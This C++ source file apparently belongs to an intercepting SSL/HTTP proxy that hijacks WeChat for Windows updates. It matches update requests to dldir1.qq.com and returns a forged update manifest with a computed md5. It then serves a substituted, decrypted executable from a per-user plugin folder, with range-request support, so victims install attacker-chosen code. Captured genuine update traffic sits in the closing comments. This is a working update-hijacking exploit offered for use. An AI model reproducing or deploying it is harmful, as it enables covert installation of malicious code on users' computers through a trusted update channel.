#include "WeixinPC.h"
#include "../cipher/CryptoUtils.h"
#include "sslPublic.h"
#include "PluginServer.h"
#include "../HttpUtils.h"
#include "../Public.h"
#include "../FileOper.h"
#include "informerClient.h"


int gWechatPCFlag = 0;

int WeixinPC::isWxPCUpdate(const char * url, const char * szdn) {
	if (strstr(szdn, "dldir1.qq.com") ) {

		if (strstr(url, "/weixin/Windows/WeChat_") && strstr(url, "_update") && strstr(url, "_ex.xml"))
		{
			gWechatPCFlag = 1;
			return TRUE;
		}
		else if (strstr(url, "/weixin/Windows/WeChat_") && strstr(url, "_update") && strstr(url, "_ex.dat"))
		{
			gWechatPCFlag = 2;
			return TRUE;
		}
	}

	return FALSE;
}


int WeixinPC::sendWxPCUpdate(char * lpbuffer,int buflimit, LPSSLPROXYPARAM pstSSLProxyParam) {
	int ret = 0;

	if (gWechatPCFlag == 1)
	{
		int ret = 0;

		char szrespformat[] =
			"HTTP/1.1 200 OK\r\n"
			"Content-Type: application/xml\r\n"
			"Content-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char * szxmlformat =
			"<file_component>\r\n"
			"<file md5=\"%s\" length=\"%u\" offset=\"0\" compresslen=\"%u\">%s</file>\r\n"
			"</file_component>\r\n";

		string username = pstSSLProxyParam->username;

		string exesrcfn = Public::getUserPluginPath(username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		string newexefn = exesrcfn + "_new.exe";
		ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);
		if (ret <= 0)
		{
			return FALSE;
		}

		string zipfn = Public::getUserPluginPath(username) + WEIXIN_PC_UPDATE_ZIP_FILENAME;
		ret = Public::zipFile(WEIXIN_PC_UPDATE_EXE_FILENAME, newexefn, zipfn);
		if (ret == 0)
		{
			return FALSE;
		}
		int zipfs = FileOper::getFileSize(zipfn);
		
		//exe file's md5,not zip file's md5
		char szmd5[256] = { 0 };
		unsigned char hexmd5[256] = { 0 };
		int exefs = CryptoUtils::getUpdateFileMd5(newexefn, szmd5, hexmd5, TRUE);
		
		DeleteFileA(newexefn.c_str());

		char fileinfo[4096];
		int infoszie = sprintf_s(fileinfo, 4096, szxmlformat, szmd5, exefs, zipfs, WEIXIN_PC_UPDATE_EXE_FILENAME);
		int packsize = sprintf_s(lpbuffer, buflimit, szrespformat, infoszie, fileinfo);
		return packsize;
	}
	else if (gWechatPCFlag == 2)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nAccept-Ranges: none\r\n"
			"Content-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(pstSSLProxyParam->username, WEIXIN_PC_UPDATE_ZIP_FILENAME);

		int ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
		return 0;
	}

	return FALSE;
}



int WeixinPC::sendWxPCUpdate(const char * url, const char * szdm, const char * httphdr, LPHTTPPROXYPARAM pstHttpProxyParam) {
	int ret = 0;

	string username = pstHttpProxyParam->username;

	string filename = Public::getUserUrl(username, WEIXIN_PC_UPDATE_ZIP_FILENAME);

	char * szHttpRespHdrFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
	char * szHttpPartialFormat = "HTTP/1.1 206 Partial Content\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Length: %u\r\n\r\n";
	string key = "Range";
	string value = HttpUtils::getValueFromKey((char*)httphdr, key);
	if (value != "")
	{
		string bytes = value.replace(value.find("bytes="), lstrlenA("bytes="), "");
		int pos = bytes.find("-");
		string start = bytes.substr(0, pos);
		string end = bytes.substr(pos + 1);
		int startno = atoi(start.c_str());
		int endno = atoi(end.c_str());

		ret = PluginServer::SendPluginFile(filename.c_str(), pstHttpProxyParam, szHttpPartialFormat, startno, endno, 1);
	}
	else {
		ret = PluginServer::SendPluginFile(filename.c_str(), pstHttpProxyParam, szHttpRespHdrFormat, 1);
	}

	return TRUE;
}



/*
dldir1.qq.com/weixin/Windows/WeChat_2.6.6_update25_ex.xml
GET /weixin/Windows/WeChat_2.6.6_update25_ex.xml HTTP/1.1
Host: dldir1.qq.com
Accept: *//*

HTTP/1.1 200 OK
Server: NWSs
Date: Fri, 15 Feb 2019 08:58:05 GMT
Content-Type: application/xml
Content-Length: 4192
Connection: keep-alive
Cache-Control: max-age=600
Expires: Fri, 15 Feb 2019 09:08:04 GMT
Last-Modified: Thu, 22 Nov 2018 06:26:40 GMT
X-NWS-UUID-VERIFY: 860ae6fe7e1adca46ef26ed0c0c9e233
X-NWS-LOG-UUID: 7ea2b199-c7d8-4d07-98e3-951fd15b7195
X-Cache-Lookup: Hit From Disktank3

<file_component>
    <file md5="f74259e5e5acbcf35f89a34bfa314d86" length="227528" offset="0" compresslen="123607">AndroidAssistHelper.dll</file>
    <file md5="9b8dba0518ee4cfe932d677b95872d5a" length="390856" offset="123607" compresslen="207776">TxBugReport.exe</file>
    <file md5="c8ea01f99f863e909e364ee4d5ad05ca" length="1691" offset="331383" compresslen="987">CEF LICENSE.txt</file>
    <file md5="34613d49c696f016d419fdbd6c1922b8" length="1989344" offset="332370" compresslen="1984536">CefResources.data</file>
    <file md5="1c9b45e87528b8bb8cfa884ea0099a85" length="2106216" offset="2316906" compresslen="927662">d3dcompiler_43.dll</file>
    <file md5="06a1bcb415afb4d80c2cfe09c6bbd252" length="3464896" offset="3244568" compresslen="1465793">d3dcompiler_47.dll</file>
    <file md5="ab54b14548a4cc76dd7c27414d971111" length="593" offset="4710361" compresslen="514">directui license.txt</file>
    <file md5="9265d88b580e05c2a3dc371770b04512" length="1426" offset="4710875" compresslen="880">duilib license.txt</file>
    <file md5="5b730557c170938e4b3bc05c027cc1b6" length="1919168" offset="4711755" compresslen="850576">ffmpegsumo.dll</file>
    <file md5="d59b13c25b710107cea7ad1462c1b077" length="10207504" offset="5562331" compresslen="4443520">icudtl.dat</file>
    <file md5="4adbc1c6bf650bce2e96865dc7a80dad" length="88256" offset="10005851" compresslen="46639">libEGL.dll</file>
    <file md5="decd41f74ebdf26290349dd74162320b" length="3888744" offset="10052490" compresslen="1641059">libFFmpeg.dll</file>
    <file md5="55438923e609bb0a777bf35b5e032aff" length="1656512" offset="11693549" compresslen="718880">libGLESv2.dll</file>
    <file md5="ae64840f70bb03a2d9beef33902ee974" length="410958" offset="12412429" compresslen="82816">natives_blob.bin</file>
    <file md5="b5df61d1b2afcde920915d06e3e39d73" length="9317064" offset="12495245" compresslen="4371081">pdf.dll</file>
    <file md5="43d2b1e3ef2e59ed73f0070c0d435632" length="1673" offset="16866326" compresslen="998">protobuf-lite LICENSE.txt</file>
    <file md5="b29e26e240757c79243429e69d918b72" length="408224" offset="16867324" compresslen="175190">QbBridge.dll</file>
    <file md5="0daa3b9837dc3a92cdcbe2803ff6cf8f" length="41678016" offset="17042514" compresslen="19215932">qbcore.dll</file>
    <file md5="0b4ac315fca949a14a904063f5c7e4ca" length="449780" offset="36258446" compresslen="142071">snapshot_blob.bin</file>
    <file md5="844c21a30916f9a7c5d3b92403a1830b" length="1670" offset="36400517" compresslen="987">SPEEX LICENSE.txt</file>
    <file md5="57b1ebafc706957823bcdafd5f85cdd8" length="338120" offset="36401504" compresslen="131444">tinyxml.dll</file>
    <file md5="edb38a7483d25937ad5c7d918518a64b" length="995032" offset="36532948" compresslen="640268">Uninstall.exe</file>
    <file md5="0157b3b7ed12995b3431f753d501d01c" length="2567840" offset="37173216" compresslen="1280248">VoipEngine.dll</file>
    <file md5="a49a3e22519d5c2bf8d7bd0be0045151" length="492744" offset="38453464" compresslen="95519">WeChat.exe</file>
    <file md5="a64975104a56a08e513afe27995863f4" length="276168" offset="38548983" compresslen="129705">WeChatExt.exe</file>
    <file md5="9253bbb02dc6d1844af8df1cc305fc3a" length="5150368" offset="38678688" compresslen="4202848">WeChatResource.dll</file>
    <file md5="3b9cdaebd1525521b7f738717f5ae29b" length="856768" offset="42881536" compresslen="390932">WeChatUpdate.exe</file>
    <file md5="d71fab1e89321955bee921870e396629" length="1130176" offset="43272468" compresslen="410040">WeChatWeb.exe</file>
    <file md5="8ac0a6f19b9865945c77cfce6019e479" length="20286112" offset="43682508" compresslen="8836116">WeChatWin.dll</file>
    <file md5="71866e6e420574e4f351109f406982e1" length="363208" offset="52518624" compresslen="179820">ssleay32.dll</file>
    <file md5="6e23b4e7cda684a333a50bc8972efc0c" length="1392840" offset="52698444" compresslen="659221">libeay32.dll</file>
    <file md5="5c5e3afd499e5146fef1da5ef8a23205" length="1080656" offset="53357665" compresslen="468315">dbghelp.dll</file>
    <file md5="b8be9e3d9d9485fab75ebe54009f1a4b" length="1152672" offset="53825980" compresslen="385632">WeChatDecoder.exe</file>
</file_component>
*/


/*
dldir1.qq.com/weixin/Windows/WeChat_2.6.6_update25_ex.dat
GET /weixin/Windows/WeChat_2.6.6_update25_ex.dat HTTP/1.1
Host: dldir1.qq.com
Range: bytes=37173216-38453463
Accept: *//*

HTTP/1.1 206 Partial Content
Server: NWSs
Date: Fri, 15 Feb 2019 08:58:06 GMT
Content-Type: application/octet-stream
Content-Length: 1280248
Connection: keep-alive
Cache-Control: max-age=600
Expires: Fri, 15 Feb 2019 09:08:05 GMT
Last-Modified: Thu, 22 Nov 2018 06:26:40 GMT
Content-Range: bytes 37173216-38453463/54211612
X-NWS-UUID-VERIFY: c3da820a35ab260564c18ed2e6740b2c
X-NWS-LOG-UUID: cd8e9d6f-c238-4dd5-b38f-6b25215ec40a
X-Cache-Lookup: Hit From Disktank3
*/